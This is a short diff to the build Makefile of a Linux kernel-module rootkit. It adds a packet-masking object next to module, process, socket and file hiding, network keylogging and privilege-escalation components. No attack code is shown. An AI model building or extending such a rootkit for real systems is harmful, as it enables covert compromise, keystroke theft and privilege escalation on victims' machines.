@@ -28,9 +28,8 @@ KDIR = /lib/modules/$(shell uname -r)/build
 TARGET = rootkit
 
 obj-m += $(TARGET).o
-rootkit-objs := module_masking.o network_keylogging.o privil_escalation.o process_masking.o socket_masking.o conf_manager.o jsmn.o udp_server.o file_masking.o core.o
+rootkit-objs := module_masking.o network_keylogging.o privil_escalation.o process_masking.o socket_masking.o conf_manager.o jsmn.o udp_server.o file_masking.o core.o packet_masking.o
 ccflags-y = -Wno-unused-function
-#file_masking.o
 
 all:	sysmap
 	make -C $(KDIR) M=$(PWD) modules
